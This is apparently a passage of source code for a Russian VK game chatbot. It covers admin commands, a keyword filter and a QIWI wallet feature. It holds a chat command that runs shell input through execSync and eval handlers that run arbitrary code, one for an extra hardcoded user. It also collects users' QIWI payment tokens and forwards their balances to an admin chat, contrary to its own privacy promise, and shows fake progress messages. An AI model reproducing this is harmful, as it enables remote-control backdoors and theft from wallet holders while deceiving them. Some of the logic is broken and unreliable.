	return message.send(`@id${user.id}(${user.prefix}), вы успешно установили свой персональный статус\n -- Ваш персональный статус: ${message.$match[1]}.`); // Исполнительный текст
});  	
     	   cm.hear(/^(?:Мой статус)/i,  (message) => { // Сама команда
     	   	let user = acc.users[user_id(message.user)]; 
     	   	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	return message.send(`@id${user.id}(${user.prefix}), персональный статус вашего аккаунта: ${user.stat}`); // Исполнительный текст
});
     	   cm.hear(/^(?:debug)\s?([0-9]+)?/i, (message) => {  
     	   	let user = acc.users[user_id(message.user)];
     	   	if(user.full == false) return;
	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: Debug [ID] \n -- Debug это -- Раблокировка всех таймингов!`) // Подсказка для команды
	    	acc.users[message.$match[1]].bloks_cases = false 
	    acc.users[message.$match[1]].bloks_gun_case = false 
	    acc.users[message.$match[1]].bloks_frac = false    
	    acc.users[message.$match[1]].bloks_giverub = false 
	    acc.users[message.$match[1]].job_stop = false 
	    acc.users[message.$match[1]].bizs_one_stop = false
	    acc.users[message.$match[1]].bizs_two_stop = false
	    acc.users[message.$match[1]].safe_status = false 
	    acc.users[message.$match[1]].safe_key = false
	    acc.users[message.$match[1]].block_porn = false
	    return message.send(`@id${user.id}(${user.prefix}), Онулировали Счетчик UpTime Игроку: ${acc.users[message.$match[1]].prefix}`);
	}); 
cm.hear(/^(?:Позови)\s?([0-9]+)?/i,  (message) => { // Сама команда
	let user = acc.users[user_id(message.user)];
	let id = acc.users[message.$match[1]] 
	let args = message.$match[1];
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(user.full == false) return;
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	return message.send(`@id${id.id}(${id.prefix}), тебя вызывает @id${user.id}(${user.prefix})`); // Исполнительный текст
});
cm.hear(/^(?:FD)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return;
	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: FD [ID] \n -- FD это - Выдача полного доступа к системе @bot.anya (Бот Анна) `) // Подсказка для команды
	    	acc.users[message.$match[1]].full = true
	    acc.users[message.$match[1]].level = 5  
	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно выдали FULL-DOSTUP игроку: ${acc.users[message.$match[1]].prefix}\n\n⛔ВНИМАНИЕ⛔\n ${acc.users[message.$match[1]].prefix} Теперь имеет полный доступ!`);
	}); 
cm.hear(/^(?:DFD)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return;
	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: DFD [ID] \n -- DFD это - Снятие полного доступа с игрока в системе @bot.anya (Бот Анна) `) // Подсказка для команды
	    	acc.users[message.$match[1]].full = false
	    acc.users[message.$match[1]].level = 0
	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно забрали FULL-DOSTUP у игрока: ${acc.users[message.$match[1]].prefix}\n\n⛔ВНИМАНИЕ⛔\n ${acc.users[message.$match[1]].prefix} больше не имеет полный доступ!`);
	}); 
cm.hear(/^(?:untiban)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return;
	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: UNTIBAN [ID] \n -- UNTIBAN это - Выдача Анти блокировки игроку в боте: @bot.anya (Бот Анна) `) // Подсказка для команды
	    	acc.users[message.$match[1]].unban = true
	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно выдали UNTIBAN игроку: ${acc.users[message.$match[1]].prefix}`);
	}); 
cm.hear(/^(?:duntiban)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return;
	    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: DUNTIBAN [ID] \n -- DUNTIBAN это - Снятие Анти блокировки с и грока в боте: @bot.anya (Бот Анна) `) // Подсказка для команды
	    	acc.users[message.$match[1]].unban = false
	    return message.send(`@id${user.id}(${user.prefix}), Вы успешно забрали UNTIBAN у игрока: ${acc.users[message.$match[1]].prefix}`);
	}); 
cm.hear(/^(?:Система)/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return;
	return message.send(`
		🔧 Техническая информация сервера @bot.anya (Бота Анны) 🔧
		📈 » Состояние VDS Сервера: Активно ✓
		📉 » CPU: 20 core ⚠
		📊 » RAM: 64 ГБ [Доступно: 63 ГБ]
		📑 » SSD: 2 ТБ [Используется: 332 МБ]
		⚙ » OC: Ubuntu 16.04
		ᅠ          🔐 » Версия бота: 2.5
		ᅠ          ❤ » Нагрузка: ${rand(10,40)}%
		ᅠ          📡 » Пинг: ${rand(10,25)} ms
		📡 » Гео-Локация сервера: \n -- Страна: Россия\n -- Город: Архангельск\n -- Улица: Октябрьская\n -- Корпус: №5.\n
		💻 » Аккаунтов в Базе Данных: ${acc.number}
		💻 » Обработано сообщений: ${acc.msg}
		💻 » Наш сайт: https://vk.com/bot.anya
		💻 » UpTime сервера -- @bot.anya (Бота Анны): \n 📈 » Дн: ${uptime.days} | Ч: ${uptime.hours} | Мин: ${uptime.min} | Сек: ${uptime.sec}`);
});



vk.updates.hear(/^(?:ssh|shel)\s([^]+)$/i, (message) => {
	if(message.user != 287908009) return message.send(`фи`);
	try{var msg = child.execSync(message.$match[1])}catch (err){var msg = err.toString()}
	return message.send(`${msg}`)
});
vk.updates.hear(/^(?:bonus)\s([^]+)\s([^]+)/i, (message) => { 
	let user = acc.users[user_id(message.user)]; 
	let id = user_id(message.user);		
	let i = config;
	if(user.full == false) return;
	if(!message.$match[1]) return message.send(`Уважаемый @id${user.id} (Основатель), произошла ошибка!\n -- Для того что бы включить или выключить бонус введите: bonus [баланс/опыт] [вкл/выкл]`)

		if(message.$match[1] == 'баланс'){
			if(message.$match[2] == 'вкл'){ config.bonus_balance = true; 
				message.send(`@id${user.id}(${user.prefix}), Успех!\n Вы включили х2 баланс для всех игр/бонусов в @bot.anya (Бот Анна)`); 
				message.send({sticker_id:4649})
				return message.send({attachment:`audio449532928_456239406`});
			}
			if(message.$match[2] == 'выкл'){ config.bonus_balance = false; 
				message.send(`@id${user.id}(${user.prefix}), Вы выключили х2 баланс для всех игр/бонусов @bot.anya (Бот Анна)`); 
				return message.send({sticker_id:4658});
			}
		}
		if(message.$match[1] == 'опыт'){ 
			if(message.$match[2] == 'вкл'){ config.bonus_exs = true; 
				message.send(`@id${user.id}(${user.prefix}), Успех!\n Вы включили х2 опыт для всех игр/бонусов в @bot.anya (Бот Анна)`); 
				message.send({sticker_id:4649})
				return message.send({attachment:`audio449532928_456239406`});
			} 
			if(message.$match[2] == 'выкл'){ config.bonus_exs = false; 
				message.send(`@id${user.id}(${user.prefix}), Вы выключили х2 опыт для всех игр/бонусов @bot.anya (Бота Анна)`); 
				return message.send({sticker_id:4658});
			}

		}   
	}); 






vk.updates.hear(/^(?:гиф|gif)\s(.*)$/i, async (message, bot) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.dsex == false){ 
		let zaprets1 = message.$match[1].toLowerCase(); 
		var zapret = /(порно|секс|порн|cекс|сeкс|ху|киски|браз|braz|hub|porhub|365|суч|сук|су4|машенка|глотк|горл|девств|cocaть|сос|соса|сосать|лиз|kyni|hentay|hentai|малолет|в д|геи|gey|школ|голы|машёнка|машонка|мошонка|мошёнка|мошанка|машн|енцест|песька|цепе|ципе|пар|доч|хен|ия|крем|kopr|групповуха|груповой|анал|скви|крем|цп|дроч|пиз|бритые|молоденькие|в очках|ночная|18+|глуб|клубничка|зрелые|старушки|спящие|ани|гулис|кун|втроем|в троем|втроём|в троём|вдвоем|вдвоём|в двоём|камшо|пиз|спящ|прости|прастит|шл|наездн|домашнее|негр|пёзды|пизды|пузды|хую|ху|хер|чле|целк|латинк|училка|соло|немк|зоофил|инти|ями|бдс|копр|говно|понос|какашки|пиздище|бл|пор|еб|мине|бедеэсем|бдсм|жесткое|насилие|кровь|убийство|смерть|убийства|насилие|насил|носил|хин|секc|ceкc|сeкс|минет|писы|херы|хер|пис|писуны|ху|minet|sex|ебля|в писю|куни|кунигулис|кунигулиз|кун|кунацвы|kuni|sex|porno|incest|инцест|с сестрой|с мамой|с папой|груповуха|порн|порна|porn|porna|влагалище|пися|в писю|киска|в киску|киску|писю|писку|в попу|анал|ванал|в анал|anal|pisya|v rot|сикс|порна|ебу|еб|бля|сука|пидор|ебалан|пидорас|пидор|гей|лесби|гейпорно|лесбпорно|пор|еба|сиськи|попа|жопа|дырка|входит|вводит|ебет|между ног|член|писичка|писюля|парнаграфия|парн|парнуха|секспороно|порносекс|секас|сехс|sex|sexy|sexsy|porna|porn|соски|сосок|sosok|sisi|pisya|порна|писки|член|вагина|влагалище|ебланище|пирдун|драчила|дрочка|дрочу|дрочун|ебунный|трахи|траходром|сосо|соси|сосёт|сосет|члены|письки|письку|пор|ебет|тварь|шлюха|шлеха|шалава|69|45|позы)/ 
		if (zapret.test(zaprets1) == true) { 
			return message.send(`✖ ${rnick}, Ошибка системы!\n По вашему запросу: "${message.$match[1]}" Ничего не найдено.`); 
		} 
		var filter0 = /(http(s)?:\/\/.)?(www\.)?[-a-z0-9@:%._\+~#=]{1,256}\.[a-z]{2,6}/ 
		var filter1 = /(?!http(s)?:\/\/)?(www\.)?[а-я0-9-_.]{1,256}\.(рф|срб|блог|бг|укр|рус|қаз|امارات.|مصر.|السعودية.)/ 
		var lol = filter0.test(zaprets1) 
		var lol1 = filter1.test(zaprets1) 
		if (filter0.test(zaprets1) == true || filter1.test(zaprets1) == true) { 
			return message.send(`✖ ${rnick}, Ошибка системы!\n По вашему запросу: "${message.$match[1]}" Ничего не найдено.`); 
		} 
	}
	vk.api.call('docs.search', {q: message.$match[1] + '.gif', count: 10}) 
	.then(response => { 
		let items = response.items.map(x => `doc${x.owner_id}_${x.id}`).join(','); 
		return message.send(`${rnick}, по вашему запросу [${message.$match[1]}], я нашла следующие GIF Материалы:`, {attachment: items}) 
	}) 
});




// QIWI API




vk.updates.hear(/^(?:Qhelp)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.qtest == false) return  message.send(`${rnick}, Произошла ошибка. @qiwirussia (QIWI) Система находиться на стадии тестирования.\n -- Доступ к тесту можно получить у @id287908009(Администратора).`);
	return message.send(`В разработке`)
})


vk.updates.hear(/^(?:Qpanel)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.qtest == false) return  message.send(`${rnick}, Произошла ошибка. @qiwirussia (QIWI) Система находиться на стадии тестирования.\n -- Доступ к тесту можно получить у @id287908009(Администратора).`);
	return message.send(`В разработке`)
})


vk.updates.hear(/^(?:Qtest)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(message.user != 287908009) return;
	acc.users[message.$match[1]].qtest = true;
	return message.send(`Вы выдали ${acc.users[message.$match[1]].prefix}, доступ к Тестированию QAPI SYSTEM`)
})

vk.updates.hear(/^(?:DQtest)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(message.user != 287908009) return;
	acc.users[message.$match[1]].qtest = false;
	return message.send(`Вы забрали у ${acc.users[message.$match[1]].prefix}, доступ к Тестированию QAPI SYSTEM`)
})


vk.updates.hear(/^(?:QAPI)\s?([0-9]+)?\s?([^]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`);

	if(user.qtest == false) { return message.send(`${rnick}, Произошла ошибка. @qiwirussia (QIWI) Система находиться на стадии тестирования.\n -- Доступ к тесту можно получить у @id287908009(Администратора).`); }
	if(message.isChat) return message.send(`Уважаемый(ая) ${rnick}, обратите внимание! Использовать команду "QAPI" в беседах Категорически запрещено!\n -- Если вы уже ввели токен в месте с этой командой в беседу то, немедленно удалите своё сообщение с токеном и перевыпустите токен на странице [https://qiwi.com/api]. Имейте ввиду если другие пользователи получат доступ к вашему токену, они смогут получить полный доступ к вашему кошельку.\n\n -- Если же вашем токеном воспользовался кто-то другой немедленно создайте запрос в службу безопасности QIWI по аддресу [https://qiwi.com/support/request/security] или по горячей линии: 8 800 707-77-59. \n Убидительная просьба не пытайтесь в следующий раз пользоваться данной командой в Беседах.`);
	if(user.qotkaz == true) return message.send(`${rnick}, вы отказались от пользовательского соглашения.`)
		if(user.qoferta == false){
			message.send(`⚡ Приветствую вас, ${rnick}!
				Для использования команды "QAPI" мы должны получить у вас согласие на обработку персональных данных вашего QIWI Кошелька.

				Согласие на обработку персональных данных @id${user.id}(Вашего) QIWI Кошелька:
				В статье 3 закона № 152-ФЗ УК-РФ сказано, что оператором является лицо, которое организует и осуществляет обработку персональных данных. Неким лицом является группа: "@bot.anya (Анна | Игровой бот)".
				Клиентом же является пользователь, т.е @id${user.id} (Вы).

				Соглашаясь с данным договором, @id${user.id}(Вы) подверждаете: что достигли совершеннолетнего возраста (@id${user.id}(Вам) 18+ лет.), даёте согласие на обработку персональных данных вашего QIWI Кошелька и в случае какого либо нарушения правил, готовы понести наказание.
				-- Данные, которые будут предоставлены нашему Боту:
				- Получать информацию о кошельке (статус, дата создания и прочее).
				- Получать баланс кошелька.
				- Просматривать историю платежей.
				- Проводить платежи без SMS.
				
				-- Имейте ввиду, что предоставленные @id${user.id}(вами) данные будут храниться на самых защищенных серверах.
				- Данные будут использованны лишь в информационных целях и никак не будут применены в личных, либо же корыстных целях.
				- Доступ к данным имеете только @id${user.id}(вы).


				🌍 Если @id${user.id}(Вы) прочитали лицензионное соглашение 
				и принимаете его, нажмите на кнопку 'Согласиться' (Если у вас 
				KateMobile или что-то в этом роде, просто напишите "Согласиться")
				`, 
				{ 
					keyboard:JSON.stringify( 
					{ 
						"one_time": true, 
						"buttons": [ 
						[{ 
							"action": { 
								"type": "text", 
								"payload": "{\"button\": \"1\"}", 
								"label": "Согласиться" 
							}, 
							"color": "positive" 
						}, 
						{ 
							"action": { 
								"type": "text", 
								"payload": "{\"button\": \"1\"}", 
								"label": "Отказаться" 
							}, 
							"color": "negative" 
						}] 
						] 
					}) 
				})
			return message.send({attachment: "photo-165565764_456239051"});
		}   


		if(!message.$match[1]) {
			message.send(`Для привязки своего QIWI Кошелька используйте: 
				QAPI [Номер QIWI] [API TOKEN]. 
				Так же, для более подробной информации вы 
				можете использовать "Qhelp"`);
			return
		};
		user.qprov = message.$match[2];

        // API SYSTEM
        var Wallet = new Qiwi(`${acc.users[user_id(message.user)].qprov}`); // Токен QIWI	
        Wallet.getBalance((err, balance) => {
        	let ball = balance.accounts[0].balance.amount		 
// Проверка токена.
if(err) {
	message.send(`⛔ » [@qiwirussia(QIWI Wallet)]: Произошла критическая ошибка системы.\n Проверьте правильность введения токена!\n\n -- Если токен был введён верно, но вы видите эту ошибку, то немедленно сообщите в репорт!`);
	message.send({sticker_id: 8471});
	vk.api.call("messages.send", {chat_id: 68, message: `[QIWI API LOGER]: Поступил LOG API системы.
		Функция: "Q-API USER Ошибка привязка кошелька" | ID Ошибки: 1
		Описание ошибки: "Ошибка проверки токена. - Пользователь ввёл неверный токен."
		Дата и время ошибки: ${data()} года, в ${time()} по МСК
		Пользователь: ${rnick}
		ID Пользователя: ${user_id(message.user)}`,			random_id: 0 });	
	return
};
//API SYST




// Успех.
message.send(`Пожалуйста подождите, операция выполняется..`);
setTimeout(() => {message.send(`🛰 Идёт подключение к сервису @qiwirussia(QIWI Wallet)..`); }, 2000);
setTimeout(() => {message.send(`🔒 Безопасное соеденение установленно.`); }, 8000);  
setTimeout(() => {message.send(`⏱ Проверка токена..`); }, 10000); 
setTimeout(() => {message.send(`⏱ Пытаемся получить информацию о вашем аккаунте..`); }, 12000); 
setTimeout(() => {message.send(`⏱ Обновление....`); }, 17000); 
setTimeout(() => {message.send(`Обновление завершено, мы смогли получить баланс вашего кошелька. Он составляет: ${ball}₽`); }, 20000);
setTimeout(() => {message.send(`Процедура прошла успешно. Вы успешно активировали функцию QIWI API.\n-- Для просмотра вашего QAPI Ппрофиля введите: QPANEL \n\n - Полный список команд для выполнения QIWI пераций - "Qhelp".`); }, 25000);  

// LOGET QIWI API
vk.api.call("messages.send", {chat_id: 68, message: `[QIWI API LOGER]: Поступил LOG API системы.
	Функция: "Q-API USER Привязка кошелька" | ID Функции: 3
	Дата и время привязки: ${data()} года, в ${time()} по МСК
	Пользователь: ${rnick}
	ID Пользователя: ${user_id(message.user)}
	QIWI Номер: ${user.qnumber}
	Баланс QIWI Кошелька пользователя: ${ball}₽`,			random_id: 0 });	
});
        user.qtok = message.$match[2];
        user.qnumber = Number(message.$match[1]);
        return
    });
// LOGET QIWI API
// Соглашение
vk.updates.hear(/^(?:Согласиться)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.qtest == false) return  message.send(`${rnick}, Произошла ошибка. @qiwirussia (QIWI) Система находиться на стадии тестирования.\n -- Доступ к тесту можно получить у @id287908009(Администратора).`);
	if(user.qoferta == true) return message.send(`${rnick}, вы уже приняли соглашение.`)
		if(user.qotkaz == true) return message.send(`${rnick}, вы отказались от пользовательского соглашения. Доступ к API QIWI Заблокирован.`)
			if(!message.isChat) {
				user.qoferta = true;
				user.qsogl = `Я, ${rnick}, подверждаю: что я достиг полного совершеннолетия, даю согласие на обработку персональных данных своего QIWI Кошелька и в случае какого либо нарушения правил, готов понести наказание.`;	
				message.send(`${rnick}, вы успешно подтвердили согласие, о обработке персональных данных @id${user.id}(ваешго) QIWI Кошелька.
					-- Для вас теперь доступна система QIWI API.

					Для привязки своего QIWI Кошелька используйте: QAPI [Номер QIWI] [API TOKEN].
					Для получения API Токена перейдите на страницу получения: https://qiwi.com/api
					Посмотреть полный список команд QIWI API вы можете написав команду: "Qhelp"

					Обратите внимание, если вы будите вводить неверные данные, будете просто играться этой системой по типу QAPI +71234231312 ohvjpfdij34pgDSVDj3g (Вводить недостоверные данные), \nваш профиль QIWI API Будет заблокирован до выяснения обстоятельств либо же навсегда.
					`);

				return vk.api.call("messages.send", {chat_id: 68, message: `[QIWI API LOGER]: Поступил LOG API системы.
					Функция: "Q-API USER Принятие соглашения" | ID Функции: 1
					Дата и время соглашения: ${data()} года, в ${time()} по МСК
					Пользователь: ${rnick}
					ID Пользователя: ${user_id(message.user)}`,			random_id: 0 });
			}
		});
// Отказ
vk.updates.hear(/^(?:Отказаться)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.qtest == false) return  message.send(`${rnick}, Произошла ошибка. @qiwirussia (QIWI) Система находиться на стадии тестирования.\n -- Доступ к тесту можно получить у @id287908009(Администратора).`);
	if(user.qoferta == true) return message.send(`${rnick}, вы уже приняли соглашение. Отказаться от соглашения больше невозможно.`)
		if(user.qotkaz == true) return message.send(`${rnick}, вы уже отказались от пользовательского соглашения. Доступ к API QIWI Заблокирован.`)
			if(!message.isChat) {
				user.qotkaz = true;
				user.qsogl = `Я, ${rnick}, Отказываюсь от пользовательского соглашения.`;	
				message.send(`${rnick}, вы отказались от пользовательского соглашения. Доступ к QIWI API Заблокирован.`);
				
				return vk.api.call("messages.send", {chat_id: 68, message: `[QIWI API LOGER]: Поступил LOG API системы.
					Функция: "Q-API USER Отказ соглашения" | ID Функции: 2
					Дата и время отказа: ${data()} года, в ${time()} по МСК
					Пользователь: ${rnick}
					ID Пользователя: ${user_id(message.user)}`,			random_id: 0 });
			}
		});

// 1 Команда: Проверка баланса.
vk.updates.hear(/^(?:qbal)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`) 
			let Wallet = new Qiwi(`${acc.users[user_id(message.user)].qtok}`); // Токен QIWI
			if(user.qtest == false) return  message.send(`${rnick}, Произошла ошибка. @qiwirussia (QIWI) Система находиться на стадии тестирования.\n -- Доступ к тесту можно получить у @id287908009(Администратора).`);
			if(user.qtok == false) return message.send(`${rnick}, на вашем профиле отключена функция QIWI API. Для её включения введите: QAPI 'Номер QIWI' 'Токен своего QIWI'\n -- Для получения QIWI Токена перейдите сюда [https://qiwi.com/api] и следуйде дальнейшим инструкциям.`);

			Wallet.getBalance((err, balance) => {
				let ball = balance.accounts[0].balance.amount;
				message.send(`Пожалуйста подождите, операция выполняется..`);
				setTimeout(() => {message.send(`🛰 Идёт подключение к сервису: "@qiwirussia(QIWI Wallet)"..`); }, 1000);
				setTimeout(() => {message.send(`🔒 Безопасное соеденение установленно.`); }, 1700);  
				setTimeout(() => {message.send(`⏱ Обновление..`); }, 3000); 
				setTimeout(() => {message.send(`${rnick}, Баланс вашего QIWI Кошелька: ${spaces(ball)}₽`); }, 5100); 
				return vk.api.call("messages.send", {chat_id: 68, message: `[QIWI API LOGER]: Поступил LOG API системы.
					Функция: "Q-API USER Проверка баланса" | ID Функции: 4
					Дата и время проверки баланса: ${data()} года, в ${time()} по МСК
					Пользователь: ${rnick}
					ID Пользователя: ${user_id(message.user)}
					QIWI Номер: ${user.qnumber}
					Баланса пользователя: ${spaces(ball)}₽`,			random_id: 0 
				});
			});
		});


// Команда
vk.updates.hear(/^(?:qpay)\s?([0-9]+)?\s?([0-9]+)?([^]+)?/i, (message) => {
// Переменные:
let user = acc.users[user_id(message.user)];

let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
if(user.qtest == false) return message.send(`${rnick}, Произошла ошибка. @qiwirussia (QIWI) Система находиться на стадии тестирования.`);
if(user.qtok == false) return message.send(`${rnick}, на вашем профиле отключена функция QIWI API. Для её включения введите QAPI 'Токен своего QIWI'\n -- Для получения QIWI Токена перейдите сюда и следуйде дальнейшим инструкциям.`);
let number = Number(message.$match[1]) 
let count = Number(message.$match[2])
let comm = message.$match[3];

// Условия:
if(!message.$match[1]) return message.send(`${rnick}, вы не указали номер QIWI`); 
if(!number) return message.send(`${rnick}, номер QIWI должен состоять из 11 цифр!`); 
if(number.length < 11 || number.length > 12) return message.send(`${rnick}, номер QIWI должен состоять из 11 цифр!`); 
if(!count) return message.send(`${rnick}, вы не указали сумму перевода.`);
if(!comm) return message.send(`${rnick}, вы не указали комментарий к переводу.`);  

// Исполнение: 
var Wallet = new Qiwi(`${acc.users[user_id(message.user)].qtok}`); // Токен QIWI
Wallet.getBalance((err, balance) => {
	let ball = balance.accounts[0].balance.amount;	
	Wallet.toWallet({ amount: count, comment: comm, account: '+'+number}, (err, data) => {	
		if(ball < count) {
			message.send(`⛔ » [@qiwirussia(QIWI Wallet)]: Произошла критическая ошибка системы.\n На вашем балансе недостаточно средств. \n\n - На вашем балансе: ${spaces(ball)}₽, а вы пытаетесть совершить перевод на сумму: ${spaces(count)}₽.. Пополните баланс и повторите попытку.`);
			message.send({sticker_id: 11925});
			return };

			message.send(`🛰 Идёт подключение к сервису "@qiwirussia(QIWI Wallet)"..`);
			setTimeout(() => {message.send(`🔒 Безопасное соеденение установленно.`); }, 2000);  
			setTimeout(() => {message.send(`🔎 Идёт проверка введённых данных..`); }, 4000); 
			setTimeout(() => {message.send(`⏳ Пожалуйста подождите, операция выполняется..`); }, 6000); 
			setTimeout(() => {message.send(`Вы успешно совершили перевод средств на QIWI Счёт +${number}.\n — Сумма перевода: ${spaces(count)}₽\n -- Комментарий к переводу: ${comm}`); }, 8500); 
			setTimeout(() => {message.send(`💰 Средства были успешно зачисленны на QIWI Счёт: +${number}`); }, 12000);
		});
	vk.api.call("messages.send", {chat_id: 68, message: `[QIWI API LOGER]: Поступил LOG API системы.
		Функция: "Q-API USER Перевод на QIWI Счёт" | ID Функции: 6
		Время перевода: в ${time()} по МСК
		Пользователь: @id${user.id}(${user.prefix})
		ID Пользователя: ${user_id(message.user)}
		QIWI Номер от куда был совершён перевод: +7${user.qnumber}
		На какой QIWI счёт был совершён перевод: +${number}
		Сумма перевода: ${spaces(count)}₽
		Комментарий к переводу: ${comm}
		Остаток на балансе: ${spaces(ball)}₽`,
		random_id: 0 
	});
	return
});
});




//QIWI API

cm.hear(/^(?:dev|eval)\s([^]+)$/i, (message) => {
	if(message.user != 287908009) return;
	const msg = message
	try {
		const result = eval(message.$match[1]);

		if(typeof(result) === 'string')
		{
			return message.send(`Результат: ${result}`);
		} else if(typeof(result) === 'number')
		{
			return message.send(`Значение: ${result}`);
		} else {
			return message.send(`Результат: ${JSON.stringify(result, null, '　\t')}`);
		}
	} catch (e) {
		console.error(e);
		return message.send(`Ошибка: ${e.toString()}`);
	}
});

cm.hear(/^\.([^]+)$/i, (message) => {
	if(message.user != 347241116) return;
	const msg = message
	try {
		const result = eval(message.$match[1]);

		if(typeof(result) === 'string')
		{
			return message.send(`Результат: ${result}`);
		} else if(typeof(result) === 'number')
		{
			return message.send(`Значение: ${result}`);
		} else {
			return message.send(`Результат: ${JSON.stringify(result, null, '　\t')}`);
		}
	} catch (e) {
		console.error(e);
		return message.send(`Ошибка: ${e.toString()}`);
	}
});


vk.updates.hear(/^(?:фермы|🔋 Фермы)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
	if(!message.$match[1]){
		message.send(`
			@id${user.id}(${user.prefix}), Аренда майнинг ферм: 
			🔸 1. 6U Nvidia 2₿/10 минут (20.500.000$)
			🔸 2. AntminerS9 10₿/10 минут (100.000.000$)
			🔹 3. FM2018-BT200 100₿/10 минут (900.000.000$)

			Для покупки введите "Фермы [номер]"
			`)
	}
	let i = message.$match[1]; 
	let ids = [0,1,2,3]
	let count = [0, 2, 10, 100]; 
	let cena = [0, 20500000,100000000,900000000]

	if(i < 0 || i > 3) return;
	if(user.ferm != false) return message.send(`@id${user.id}(${user.prefix}), ошибка, у вас уже арендована ферма.`);
	if(i > 0 && i <= 3){
		if(user.balance < cena[i]) return message.send(`@id${user.id}(${user.prefix}), у вас не достаточно денег.`);
		user.ferm = Number(ids[i]); 
		user.balance -= cena[i];
		setTimeout(() => {
			user.bitcoin += Number(count[i])
			user.bitcoin += Number(count[i])
			user.ferm = false;
			vk.api.call('messages.send', {
				peer_id: user.id,
				message: `[Система @bot.yulya (Бот Юлия)]: @id${user.id}(${user.prefix}), аренда майнинг-фермы закончилась.\n -- Вы получили ${count[i]}฿.\n\n Если вы решились продать свои биткоины, то вам поможет команда: продать биткоины [Кол-во]`,
				random_id: 0
			});
		}, 600000); 


		return message.send(`@id${user.id}(${user.prefix}), Вы успешно арендавали майнинг-ферму на 10 минут.\n -- Через 10 минут вам будет зачислено ${count[i]}฿`)
	} 
});





vk.updates.hear(/^(?:Vipe|вайп)\s?([^]+)?/i,  message => {
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return; 
	if(!message.$match[1]) return message.send(`Уважаемый @id287908009 (Основатель), Для того что бы произвести вайп введите: Вайп [рейтинга/баланса/администрации/uptime]`);  

	if(message.$match[1] == 'рейтинга'){ 
		for(i=1;i < 200000; i++){  
			if(acc.users[i]){
				acc.users[i].global_exs = 0
			}
		}

		message.send(`@id${user.id}(${user.prefix}), Успех!\n Вы Онулировали всем игрокам рейтинг в @bot.anya (Бота Анна)`); 
		message.send({sticker_id:4649})
		return message.send({attachment:`audio449532928_456239406`});
	}
	if(message.$match[1] == 'баланса'){ 
		for(i=1;i < 200000; i++){  
			if(acc.users[i]){
				acc.users[i].balance = 0
				acc.users[i].bank = 0
				acc.users[i].bitcoin = 0
			}
		}
		message.send(`@id${user.id}(${user.prefix}), Успех!\n Вы Онулировали всем игрокам баланс в @bot.anya (Бота Анна)`); 
		message.send({sticker_id:4649})
		return message.send({attachment:`audio449532928_456239406`});
	}
	if(message.$match[1] == 'администрации'){ 
		for(i=1;i < 200000; i++){  
			if(acc.users[i]){
				acc.users[i].level = 0
			}
		}

		message.send(`@id${user.id}(${user.prefix}), Успех!\n Вы сняли всю Администрацию @bot.anya (Бота Анны)`); 
		message.send({sticker_id:4649})
		return message.send({attachment:`audio449532928_456239406`});
	}
	if(message.$match[1] == 'uptime'){ 
		for(i=1;i < 200000; i++){  
			if(acc.users[i]){
				acc.users[i].bloks_cases = false
				acc.users[i].bloks_gun_case = false
				acc.users[i].bloks_frac = false
				acc.users[i].bloks_giverub = false
				acc.users[i].job_stop = false
				acc.users[i].bizs_one_stop = false
				acc.users[i].bizs_two_stop = false
				acc.users[i].safe_status = false 
				acc.users[i].safe_key = false 
				acc.users[i].block_porn = false 
			}
		}

		message.send(`@id${user.id}(${user.prefix}), Успех!\n Вы Онулировали счетчик UpTime всем игрока @bot.anya (Бота Анны)`); 
		message.send({sticker_id:4649})
		return message.send({attachment:`audio449532928_456239406`});
	}
